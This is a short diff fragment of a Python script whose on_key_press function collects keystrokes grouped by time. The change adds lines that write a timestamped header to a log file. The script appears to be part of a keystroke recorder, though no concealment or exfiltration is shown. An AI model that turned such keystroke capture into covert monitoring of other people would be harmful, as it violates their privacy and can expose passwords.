@@ -12,6 +12,9 @@ def on_key_press(key):                             #A function that receives inp
 
     if currentTime not in dicti:
         dicti[currentTime] = ''
+        fili = open(filename, "a")
+        fili.write(f"**** {currentTime} ****\n")
+        fili.close()
 
     dicti[currentTime] += key
     str_for_show += key
